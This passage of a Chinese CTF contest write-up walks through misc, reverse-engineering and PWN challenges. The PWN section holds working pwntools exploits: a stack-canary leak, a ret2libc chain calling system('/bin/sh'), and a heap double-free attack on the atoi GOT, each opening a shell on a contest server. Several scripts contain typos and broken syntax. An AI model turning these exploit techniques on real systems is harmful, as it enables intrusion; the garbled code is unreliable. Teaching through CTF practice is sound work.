alt="在这里插入图片描述"><br>Vm1wR2EwNUhTWGxVYms1cFRUSjRWbFl3WkRSWFJteHpZVVZPYWxadGVIcFdNbmgzWVRBeFZrNVdaRnBXVmxwUVdWVmFTbVF3TVZWWGJHUlRUVEJLVVZkV1dsWmtNbEY1Vkd0c1ZHSkdXazlaYlhSTFpVWmFSMWR0Um1waVZscFlWako0VjFWdFJqWmlTRUpYWWtkb1JGcFhlR0ZTVmtaelZHMXNhR1ZzV2toV1JscHZVakZhYzFwRmJGSmlSVXBoVm1wT1QwMHhVbGRYYkU1clVsUkdWMVJzWkRSV01WcEhWMnh3VjJFeGNGUldha1pyWkVaS2RWTnNhR2xpUlhCWFYxY3dNVkV5UmtkaVJtUlhWMGRvVUZscmFFTlRWbkJKWWpOa1VWVlVNRGs9<br>经过多次Base64解密后，得到密码<br><img src="https://img-blog.csdnimg.cn/0287ff040f09456a9df7b3ab4dd4b623.png" alt="在这里插入图片描述"><br>利用脚本将图片中的数据跑出来<br><img src="https://img-blog.csdnimg.cn/daf2ac8404b344f391481cf34bc0e290.png" alt="在这里插入图片描述"><br>跑出一个带密码的压缩包，密码填<br>75ce46be8882436396c25c9b1f76b37e 得到flag</p>
<h2 id="Guess-Where"><a href="#Guess-Where" class="headerlink" title="Guess!Where?"></a>Guess!Where?</h2><p>下载附件，按照凯撒3、base64、base32、base16的顺序解密，得到密文  I_love_iscc!!! 打开压缩包，按照时间顺序排序，会发现ISC2<br><img src="https://img-blog.csdnimg.cn/eabe36dac3a8414b83767301138d142b.png" alt="在这里插入图片描述"><br>写脚本爆出flag<br><img src="https://img-blog.csdnimg.cn/91041df83a6c49aabfc01f7c00277dbd.png" alt="在这里插入图片描述"></p>
<h1 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h1><h2 id="JustDoIt"><a href="#JustDoIt" class="headerlink" title="JustDoIt"></a>JustDoIt</h2><p>拖入EXE，发现无壳，拖入32位IDA，找到main函数，F5反汇编，分析函数<br>通过分析是对输入的字符进行加密再与加密的 flag 比较<br>加密函数<br><img src="https://img-blog.csdnimg.cn/6cb781f0fb074076a42c601da40cf984.png#pic_center" alt="在这里插入图片描述"><br>写脚本如下：</p>
<pre><code class="hljs python">v8=[<span class="hljs-number">23</span>,<span class="hljs-number">68</span>,<span class="hljs-number">68</span>,<span class="hljs-number">15</span>,<span class="hljs-number">94</span>,<span class="hljs-number">10</span>,<span class="hljs-number">8</span>,<span class="hljs-number">10</span>,<span class="hljs-number">6</span>,<span class="hljs-number">95</span>,<span class="hljs-number">8</span>,<span class="hljs-number">24</span>,<span class="hljs-number">87</span>,<span class="hljs-number">3</span>,<span class="hljs-number">26</span>,<span class="hljs-number">105</span>]
v7=<span class="hljs-string">&#x27;ISCC&#x27;</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-built_in">len</span>(v8)):
 v8[i]^=<span class="hljs-built_in">ord</span>(v7[<span class="hljs-number">0</span>])
 v8[i]-=<span class="hljs-built_in">ord</span>(v7[i%<span class="hljs-number">4</span>])%<span class="hljs-number">5</span>
 v8[i]=v8[i]+<span class="hljs-built_in">ord</span>(v7[<span class="hljs-number">2</span>])%<span class="hljs-number">6</span>+<span class="hljs-built_in">ord</span>(v7[<span class="hljs-number">3</span>])// <span class="hljs-number">6</span>
 v8[i]-=<span class="hljs-built_in">ord</span>(v7[<span class="hljs-number">1</span>])//<span class="hljs-number">7</span>+<span class="hljs-built_in">ord</span>(v7[<span class="hljs-number">0</span>])%<span class="hljs-number">7</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-built_in">len</span>(v8)):
 v8[i]-=i
t=v8[<span class="hljs-built_in">len</span>(v8)-<span class="hljs-number">1</span>]
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(v8)-<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,-<span class="hljs-number">1</span>):
 v8[i]=v8[i-<span class="hljs-number">1</span>]
v8[<span class="hljs-number">0</span>]=t
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(v8)):
 v8[i]+=<span class="hljs-number">60</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(v8)):
 <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(v8[i]),end=<span class="hljs-string">&#x27;&#x27;</span>)</code></pre>
<p>运行得到flag</p>
<h2 id="奇门遁甲"><a href="#奇门遁甲" class="headerlink" title="奇门遁甲"></a>奇门遁甲</h2><p>附件下载，拖入EXE，无壳，拖入32位IDA，F5反汇编<br><img src="https://img-blog.csdnimg.cn/07f5bf36cd08449eb7336caa42bba026.png#pic_center" alt="在这里插入图片描述"></p>
<p>打开程序知道要按一定的顺序要求依次输出每个门，得到碎片，最终拼成flag<br>通过穷举法得出正确的顺序应该为31284567，因此得到flag为?48?IKuSzv;UZrzWTLLuV8VG</p>
<h2 id="变形记"><a href="#变形记" class="headerlink" title="变形记"></a>变形记</h2><p>下载附件，拖入EXE，拖入32位IDA，F5反汇编，找到关键字符串<br><img src="https://img-blog.csdnimg.cn/2f917999bcfa435da0a3fe28cc85f536.png#pic_center" alt="在这里插入图片描述"><br>取出字符串先逆序得到base64密文Y3lReWNzQmN5UXkyc3Z5djJ6YzI=，再解密得到cyQycsBcyQy2svyv2zc2，然后是一个字符串压缩，就是换成重复个数<br>比如解出来的带有B2字样，就变成BB，以此类推<br>所以最终得到flag为ISCC[cyQycsBcyQyysvyvvzcc]</p>
<h2 id="Convert"><a href="#Convert" class="headerlink" title="Convert"></a>Convert</h2><p>拖入EXE，拖入32位IDA，F5反汇编，进入main_0函数<br>根据显示的密文写出一个c++的运行代码</p>
<pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bitsdc++.h&gt;</span></span>
<span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;
<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>
<span class="hljs-function"></span>&#123;
   <span class="hljs-type">int</span> v6 = <span class="hljs-number">23</span>,j=<span class="hljs-number">0</span>;
    <span class="hljs-type">char</span> v8[<span class="hljs-number">26</span>] = <span class="hljs-string">&quot;(0$$b&lt;&quot;</span>;
    v8[<span class="hljs-number">6</span>] = <span class="hljs-number">25</span>;
    v8[<span class="hljs-number">7</span>] = <span class="hljs-number">30</span>;
    v8[<span class="hljs-number">8</span>] = <span class="hljs-number">45</span>;
    v8[<span class="hljs-number">9</span>]= <span class="hljs-number">53</span>;
    v8[<span class="hljs-number">10</span>]=<span class="hljs-number">66</span>;
    v8[<span class="hljs-number">11</span>] = <span class="hljs-number">42</span>;
    v8[<span class="hljs-number">12</span>] = <span class="hljs-number">-88</span>;
    v8[<span class="hljs-number">13</span>] = <span class="hljs-number">-123</span>;
    v8[<span class="hljs-number">14</span>] = &amp;apos;a&amp;apos;;
    v8[<span class="hljs-number">15</span>] =&amp;apos;e&amp;apos; ;
    v8[<span class="hljs-number">16</span>] = &amp;apos;<span class="hljs-number">6</span>&amp;apos;;
    v8[<span class="hljs-number">17</span>] = &amp;apos;/&amp;apos;;
    v8[<span class="hljs-number">18</span>] =&amp;apos;C&amp;apos; ;
    v8[<span class="hljs-number">19</span>] = &amp;apos;W&amp;apos;;
    v8[<span class="hljs-number">20</span>] = &amp;apos;<span class="hljs-string">&quot;&amp;apos;;</span>
<span class="hljs-string">    v8[21] = &amp;apos;H&amp;apos;;</span>
<span class="hljs-string">    v8[22]=&amp;apos;s&amp;apos;;                                  </span>
<span class="hljs-string">    char a2[] = &quot;</span>ISCC<span class="hljs-string">&quot;;</span>
<span class="hljs-string">    for (j = 0; j &lt; 4; ++j)</span>
<span class="hljs-string">    &#123;</span>
<span class="hljs-string">            v8[j + 16] -= a2[j] / 5;</span>
<span class="hljs-string">            v8[j + 12] -= v8[j + 4];</span>
<span class="hljs-string">            v8[j + 8] -= 2 * j;</span>
<span class="hljs-string">            v8[j + 4] -= a2[j] % 5;</span>
<span class="hljs-string">            v8[j] -= j ^ -(a2[j] % 4);</span>
<span class="hljs-string">     &#125;</span>
<span class="hljs-string">     for (int i = 0; i &lt; v6; i++)</span>
<span class="hljs-string">     &#123;</span>
<span class="hljs-string">            v8[i] -= i;</span>
<span class="hljs-string">            v8[i] += 32;</span>
<span class="hljs-string">             cout &lt;&lt; v8[i];</span>
<span class="hljs-string">     &#125;</span>
<span class="hljs-string">&#125;</span></code></pre>
<p>运行得到flag</p>
<h2 id="Pull-the-Wool-Over-People’s-Eyes"><a href="#Pull-the-Wool-Over-People’s-Eyes" class="headerlink" title="Pull the Wool Over People’s Eyes"></a>Pull the Wool Over People’s Eyes</h2><p>拖入EXE查壳，发现无壳并拖入32位IDA，找到main函数，F5反汇编<br>在 main 函数中发现一串可疑的二进制字符，分析是处理过的<br><img src="https://img-blog.csdnimg.cn/e56813a6d73e40b2b1c13ef0ef66bcd2.png#pic_center" alt="在这里插入图片描述"><br>写脚本如下：</p>
<pre><code class="hljs python">key = <span class="hljs-built_in">list</span>(<span class="hljs-string">b&#x27;ISCC&#123;ACYeeeloorrsuv&#125;&#x27;</span>)
flag = 
<span class="hljs-string">&quot;00000000000000000000000000000000000000000010001000100010000011100000011000</span>
<span class="hljs-string">001110001001110010111000101100010110000011110000110101000111100001110100101</span>
<span class="hljs-string">10000000000&quot;</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(flag)//<span class="hljs-number">8</span>):
<span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(flag[i*<span class="hljs-number">8</span>:i*<span class="hljs-number">8</span>+<span class="hljs-number">8</span>],<span class="hljs-number">2</span>)^key[i]),end=<span class="hljs-string">&quot;&quot;</span>)</code></pre>
<p>运行得到flag</p>
<h2 id="狂飙-1"><a href="#狂飙-1" class="headerlink" title="狂飙-1"></a>狂飙-1</h2><p>下载题目，其中包含三个文件根据分析写出脚本</p>
<pre><code class="hljs python">mod=<span class="hljs-number">26</span>
a1=<span class="hljs-number">0x50d7c32f4a659</span>
a2=<span class="hljs-string">&quot;4-chloroisatin&quot;</span>
a3=<span class="hljs-string">&quot;Ammosamide B&quot;</span>
mod_out=(<span class="hljs-built_in">int</span>((a1%<span class="hljs-number">100000</span>)%mod))^(mod*(<span class="hljs-built_in">int</span>)(a1%<span class="hljs-number">100000</span>))
flag=<span class="hljs-string">&quot;ISCC&#123;&quot;</span>+<span class="hljs-built_in">str</span>(mod_put)+<span class="hljs-string">&quot;_&quot;</span>+a2+<span class="hljs-string">&quot;_&quot;</span>+<span class="hljs-built_in">str</span>(a1)+<span class="hljs-string">&quot;_&quot;</span>+a3+<span class="hljs-string">&quot;&#125;&quot;</span>
<span class="hljs-built_in">print</span>(flag)</code></pre>
<p>运行得到flag</p>
<h2 id="CrackMePlease"><a href="#CrackMePlease" class="headerlink" title="CrackMePlease"></a>CrackMePlease</h2><p>拖入exe，拖入32位IDA，F5反汇编，跟进main_0函数，分析代码<br>在关键语句前下断点<br><img src="https://img-blog.csdnimg.cn/17e83f03f2a34a69b7a42c7b16756d47.png" alt="在这里插入图片描述"><br>进行调试运行<br><img src="https://img-blog.csdnimg.cn/b9937246dd3d40bf8d1c2a04f9968f93.png" alt="在这里插入图片描述"><br>随机输入一个数字进行运行<br><img src="https://img-blog.csdnimg.cn/9073d230b66041cdbe22cb7a16beae40.png" alt="在这里插入图片描述"><br>进入str2寻找到flag</p>
<h2 id="Congratulations"><a href="#Congratulations" class="headerlink" title="Congratulations"></a>Congratulations</h2><p>把附件拖进ida，初步分析是用给出的密文，转换进制加密，写脚本跑出flag</p>
<pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>
&#123;
    <span class="hljs-type">char</span> v9[<span class="hljs-number">26</span>]; <span class="hljs-comment">// [esp+140h] [ebp-28h]</span>
     v9[<span class="hljs-number">0</span>] = <span class="hljs-number">165</span>;
  v9[<span class="hljs-number">1</span>] = <span class="hljs-number">67</span>;
  v9[<span class="hljs-number">2</span>] = <span class="hljs-number">83</span>;
  v9[<span class="hljs-number">3</span>] = <span class="hljs-number">148</span>;
  v9[<span class="hljs-number">4</span>] = <span class="hljs-number">68</span>;
  v9[<span class="hljs-number">5</span>] = <span class="hljs-number">67</span>;
  v9[<span class="hljs-number">6</span>] = <span class="hljs-number">84</span>;
  v9[<span class="hljs-number">7</span>] = <span class="hljs-number">72</span>;
  v9[<span class="hljs-number">8</span>] = <span class="hljs-number">155</span>;
  v9[<span class="hljs-number">9</span>] = <span class="hljs-number">168</span>;
  v9[<span class="hljs-number">10</span>] = <span class="hljs-number">175</span>;
  v9[<span class="hljs-number">11</span>] = <span class="hljs-number">120</span>;
  v9[<span class="hljs-number">12</span>] = <span class="hljs-number">171</span>;
  v9[<span class="hljs-number">13</span>] = <span class="hljs-number">132</span>;
  v9[<span class="hljs-number">14</span>] = <span class="hljs-number">31</span>;
  v9[<span class="hljs-number">15</span>] = <span class="hljs-number">137</span>;
  v9[<span class="hljs-number">16</span>] = <span class="hljs-number">170</span>;
  v9[<span class="hljs-number">17</span>] = <span class="hljs-number">186</span>;
  v9[<span class="hljs-number">18</span>] = <span class="hljs-number">84</span>;
  v9[<span class="hljs-number">19</span>] = <span class="hljs-number">17</span>;
  v9[<span class="hljs-number">20</span>] = <span class="hljs-number">80</span>;
  v9[<span class="hljs-number">21</span>] = <span class="hljs-number">162</span>;
  v9[<span class="hljs-number">22</span>] = <span class="hljs-number">186</span>;
  v9[<span class="hljs-number">23</span>] = <span class="hljs-number">121</span>;
  v9[<span class="hljs-number">24</span>] = <span class="hljs-number">247</span>;
    v9[<span class="hljs-number">25</span>] = <span class="hljs-string">&#x27;_&#x27;</span>;
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">25</span>; i++)
    &#123;
        v9[i] ^= <span class="hljs-string">&#x27;S&#x27;</span>;
    &#125;
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">24</span>; i &gt;= <span class="hljs-number">0</span>; i--)
    &#123;
        v9[i] += v9[i + <span class="hljs-number">1</span>];
    &#125;
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">26</span>; i++)
    &#123;
        v9[i] += <span class="hljs-number">30</span>;
    &#125;
    <span class="hljs-type">char</span> v5[] = <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyz&quot;</span>;
    <span class="hljs-type">char</span> v4[] = <span class="hljs-string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">26</span>; i++)
    &#123;
        <span class="hljs-keyword">if</span> (v9[i] == <span class="hljs-string">&#x27;&#123;&#x27;</span> || v9[i] == <span class="hljs-string">&#x27;&#125;&#x27;</span>)
        &#123;
            <span class="hljs-keyword">continue</span>;
        &#125;

        <span class="hljs-keyword">if</span> (v9[i] &gt;= <span class="hljs-string">&#x27;A&#x27;</span> &amp;&amp; v9[i] &lt;= <span class="hljs-string">&#x27;Z&#x27;</span>)
        &#123;
            v9[i] += <span class="hljs-number">1</span>;
        &#125;
        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (v9[i] &gt;= <span class="hljs-string">&#x27;a&#x27;</span> &amp;&amp; v9[i] &lt;= <span class="hljs-string">&#x27;z&#x27;</span>)
        &#123;
            v9[i] += <span class="hljs-number">1</span>;
        &#125;
    &#125;
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">26</span>; i++)
    &#123;
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>, v9[i]);
    &#125;
&#125;</code></pre>
<p><img src="https://img-blog.csdnimg.cn/089b2763309f4f18820aa3ef70ca6f85.png" alt="在这里插入图片描述"></p>
<h2 id="狂飙-2"><a href="#狂飙-2" class="headerlink" title="狂飙-2"></a>狂飙-2</h2><p>根据提示<br>提示1：某个文件有些特殊<br>提示2：看看《狂彪》-1<br>提示3：似乎不只是一张图片哦<br>然后研究里面附件是被加密的并且给了一个key</p>
<pre><code class="hljs python">file.namelist()
    elf_name = zip_list[<span class="hljs-number">1</span>]
    zip_file.extract(elf_name, <span class="hljs-string">&#x27;.&#x27;</span>, pwd=key)
    zip_file.close()

    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(elf_name, <span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> f:
        elf_data = f.read()

    <span class="hljs-keyword">return</span> elf_data[<span class="hljs-number">0xe010</span>:<span class="hljs-number">0xe030</span>]

<span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_flag</span>(<span class="hljs-params">data</span>):
    flag = <span class="hljs-string">&quot;ISCC&#123;tHe_5eY@&quot;</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(data)):
        d = data[i] - <span class="hljs-number">16</span>
        d ^= <span class="hljs-number">2</span>
        d += <span class="hljs-number">44</span>
        flag += <span class="hljs-built_in">chr</span>(d)
    <span class="hljs-keyword">return</span> flag

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:
    key = <span class="hljs-string">b&quot;1422201965553241&quot;</span>
    enc_file = <span class="hljs-string">&quot;cellphone.enc&quot;</span>
    data = decrypt_data(key, enc_file)
    flag = generate_flag(data)
    <span class="hljs-built_in">print</span>(flag)
</code></pre>
<p>运行得到flag</p>
<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="三个愿望"><a href="#三个愿望" class="headerlink" title="三个愿望"></a>三个愿望</h2><p>附件下载，拖入EXE，拖入64位IDA，F5反汇编，shift+F12搜索字符串<br><img src="https://img-blog.csdnimg.cn/2d36c4a0f9b54f93b3361f6a0726a484.png#pic_center" alt="在这里插入图片描述"><br>找到/bin/bash，说明存在常规后门<br>回到main函数，跟进begingame()，分析代码<br>第一个愿望由随机数种子除以9取余加一得到<br>srand(v6)，此时v3=1<br>跟进secondwish()；<br><img src="https://img-blog.csdnimg.cn/fddefaa7300a49ce929283d860c6afaa.png#pic_center" alt="在这里插入图片描述"><br>通过%n$p多次试验得到canary的值为6<br>s距离rbp的距离为30，v2距离rbp<br>计算0x30-0x8+6得到v2的地址，因此通过第二个愿望<br>跟进thirdwish();<br><img src="https://img-blog.csdnimg.cn/ef27735d23844aa48f3fb7e5558f5cc4.png#pic_center" alt="在这里插入图片描述"><br>结合之前发现的/bin/bash，为典型栈溢出问题<br>写脚本：</p>
<pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span>
<span class="hljs-comment">#elf=ELF(&#x27;./f3&#x27;)</span>
back=<span class="hljs-number">0x4011d6</span>
<span class="hljs-comment">#p=process(&#x27;./f3&#x27;)</span>
p=remote(<span class="hljs-string">&quot;59.110.164.72&quot;</span>,<span class="hljs-number">10001</span>)
p.sendline(<span class="hljs-string">b&#x27;1&#x27;</span>)
p.sendline(<span class="hljs-string">b&#x27;7&#x27;</span>)
p.sendline(<span class="hljs-string">b&#x27;%11$p&#x27;</span>)

p.recvuntil(<span class="hljs-string">b&#x27;wish!\n&#x27;</span>)
canary=<span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">18</span>),<span class="hljs-number">16</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(canary))

p.sendline(<span class="hljs-string">b&#x27;2&#x27;</span>)
pay=p64(canary*<span class="hljs-number">6</span>+p64(back)*<span class="hljs-number">2</span>
p.sendline(pay)

p.interactuve()</code></pre>
<h2 id="Login"><a href="#Login" class="headerlink" title="Login"></a>Login</h2><ol>
<li>分析<br>用 checksec 工具分析程序<br><img src="https://img-blog.csdnimg.cn/df4c07aafbfd46c989e24874e3f28613.png#pic_center" alt="在这里插入图片描述"><br>再用 ida 看源码<br><img src="https://img-blog.csdnimg.cn/ae86ae662f4c4f76a9ca7bfc4308d9ce.png#pic_center" alt="在这里插入图片描述"></li>
<li>思路<br>通过分析，输入存在多处栈溢出<br>第一次把 v6 的值覆盖为 365696460，使程序能走到第二次栈溢出<br>再在第二次栈溢出布置栈帧<br>程序没有现成的后门函数，可以泄漏地址但程序已经给了，所有只要授受地址，再<br>通用题目给的 libc 文件来计算基址，再调用 libc 中的 system 函数</li>
<li>exp</li>
</ol>
<pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
<span class="hljs-number">5.</span> <span class="hljs-keyword">import</span> struct
<span class="hljs-number">6.</span> <span class="hljs-keyword">import</span> os
<span class="hljs-number">7.</span>
<span class="hljs-number">8.</span> context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)
<span class="hljs-number">9.</span> elf = ELF(<span class="hljs-string">&quot;./Login&quot;</span>)
<span class="hljs-number">10.</span>libc = ELF(<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>)
<span class="hljs-number">11.</span>DEBUG = <span class="hljs-number">0</span>
<span class="hljs-number">12.</span>
<span class="hljs-number">13.</span><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>(<span class="hljs-params">p</span>):
<span class="hljs-number">14.</span> p.recvuntil(<span class="hljs-string">&quot;Here is a tip: 0x&quot;</span>)
<span class="hljs-number">15.</span> std_addr = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>), <span class="hljs-number">16</span>)
<span class="hljs-number">16.</span> info(<span class="hljs-string">&quot;std_addr-----&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(std_addr))
<span class="hljs-number">17.</span> libc.address = std_addr - <span class="hljs-number">0x3c48e0</span>
<span class="hljs-number">18.</span> p.recvuntil(<span class="hljs-string">&quot;input the username:\n&quot;</span>)
<span class="hljs-number">19.</span> p.send(<span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">28</span>+<span class="hljs-string">b&quot;\xCC\x15\xCC\x15&quot;</span>)
<span class="hljs-number">20.</span> p.recvuntil(<span class="hljs-string">&quot;input the password:\n&quot;</span>)
<span class="hljs-number">21.</span> payload = <span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">0x28</span> + p64(<span class="hljs-number">0x00000000004008c3</span>) +
p64(libc.search(<span class="hljs-string">b&quot;/bin/sh&quot;</span>).__next__()) + p64(libc.sym[<span class="hljs-string">&quot;system&quot;</span>])
<span class="hljs-number">22.</span> p.send(payload)
<span class="hljs-number">23.</span> p.interactive()
<span class="hljs-number">24.</span>
<span class="hljs-number">25.</span><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():
<span class="hljs-number">26.</span> <span class="hljs-keyword">if</span> DEBUG:
<span class="hljs-number">27.</span> p = process(<span class="hljs-string">&quot;./Login&quot;</span>)
<span class="hljs-number">28.</span> gdb.attach(p, <span class="hljs-string">&quot;source ./.gdbinit&quot;</span>)
<span class="hljs-number">29.</span> exp(p)
<span class="hljs-number">30.</span>
<span class="hljs-number">31.</span> <span class="hljs-keyword">else</span>:
<span class="hljs-number">32.</span> p = remote(<span class="hljs-string">&quot;59.110.164.72&quot;</span>, <span class="hljs-number">10000</span>)
<span class="hljs-number">33.</span> exp(p)
<span class="hljs-number">34.</span>
<span class="hljs-number">35.</span><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:
<span class="hljs-number">36.</span> main()</code></pre>

<h2 id="Double"><a href="#Double" class="headerlink" title="Double"></a>Double</h2><ol>
<li>分析<br>用checksec工具分析程序<br><img src="https://img-blog.csdnimg.cn/208e6a616c4247cbbe94ad1c41e2c542.png#pic_center" alt="在这里插入图片描述"><br>再看IDA源代码，存在堆漏洞</li>
<li>exp</li>
</ol>
<pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*
<span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *

<span class="hljs-comment">#context.arch=&quot;amd64&quot;</span>
<span class="hljs-comment">#context.arch=&quot;i386&quot;</span>
context.os=<span class="hljs-string">&quot;linux&quot;</span>
context.log_level=<span class="hljs-string">&quot;debug&quot;</span>
elf=ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)
libc=ELF(<span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span>)

io=<span class="hljs-number">1</span>
<span class="hljs-keyword">if</span> io==<span class="hljs-number">0</span>:
   p=process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)
<span class="hljs-keyword">else</span>:
   p=remote(<span class="hljs-string">&#x27;59.110.164.72&#x27;</span>,<span class="hljs-number">10021</span>)

<span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>():
   gdb.attach(p)
   pause()

<span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params"><span class="hljs-built_in">id</span>,size</span>):
   p.sendlineafter(<span class="hljs-string">&#x27;请选择：&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)
   p.sendlineafter(<span class="hljs-string">&#x27;请输入序号：&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))
   p.sendlineafter(<span class="hljs-string">&#x27;请输入大小：&#x27;</span>,<span class="hljs-built_in">str</span>(size))

<span class="hljs-keyword">def</span> <span class="hljs-title function_">dele</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):
   p.sendlineafter(<span class="hljs-string">&#x27;请选择：&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)
   p.sendlineafter(<span class="hljs-string">&#x27;请输入序号：&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))

<span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):
   p.sendlineafter(<span class="hljs-string">&#x27;请选择：&#x27;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)
   p.sendlineafter(<span class="hljs-string">&#x27;请输入序号：&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))

<span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params"><span class="hljs-built_in">id</span>,pay</span>):
   p.sendlineafter(<span class="hljs-string">&#x27;请选择：&#x27;</span>,<span class="hljs-string">b&#x27;4&#x27;</span>)
   p.sendlineafter(<span class="hljs-string">&#x27;请输入序号：&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))
   p.sendafter(<span class="hljs-string">&#x27;请输入编辑内容：&#x27;</span>,pay)
add(<span class="hljs-number">2</span>,<span class="hljs-number">0x41</span>)
add(<span class="hljs-number">16</span>,<span class="hljs-number">0x40</span>)
add(<span class="hljs-number">18</span>,<span class="hljs-number">0x30</span>)

add(<span class="hljs-number">4</span>,<span class="hljs-number">0x30</span>)
add(<span class="hljs-number">5</span>,<span class="hljs-number">0x30</span>)
add(<span class="hljs-number">6</span>,<span class="hljs-number">0x30</span>)

dele(<span class="hljs-number">4</span>)
dele(<span class="hljs-number">5</span>)
dele(<span class="hljs-number">4</span>)

add(<span class="hljs-number">7</span>,<span class="hljs-number">0x30</span>)
edit(<span class="hljs-number">7</span>,p64(<span class="hljs-number">0x6020e0</span>))

add(<span class="hljs-number">8</span>,<span class="hljs-number">0x30</span>)
add(<span class="hljs-number">9</span>,<span class="hljs-number">0x30</span>)
add(<span class="hljs-number">10</span>,<span class="hljs-number">0x30</span>)<span class="hljs-comment">#sizes</span>

add(<span class="hljs-number">4</span>,<span class="hljs-number">0x40</span>)
add(<span class="hljs-number">5</span>,<span class="hljs-number">0x90</span>)

edit(<span class="hljs-number">10</span>,p32(<span class="hljs-number">0x50</span>))

ptrs=<span class="hljs-number">0x6024e0</span>
fd=ptrs+<span class="hljs-number">8</span>
bk=ptrs+<span class="hljs-number">16</span>
pay=p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x41</span>)+p64(fd)+p64(bk)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span>+p64(<span class="hljs-number">0x40</span>)+p64(<span class="hljs-number">0xa0</span>)
edit(<span class="hljs-number">4</span>,pay)

dele(<span class="hljs-number">5</span>)

edit(<span class="hljs-number">4</span>,p64(<span class="hljs-number">0</span>)+p64(elf.got[<span class="hljs-string">&#x27;atoi&#x27;</span>]))

edit(<span class="hljs-number">2</span>,p64(<span class="hljs-number">0x4008FE</span>))

p.sendlineafter(<span class="hljs-string">&#x27;请选择：&#x27;</span>,<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)

p.interactive()</code></pre>
<h2 id="chef"><a href="#chef" class="headerlink" title="chef"></a>chef</h2><ol>
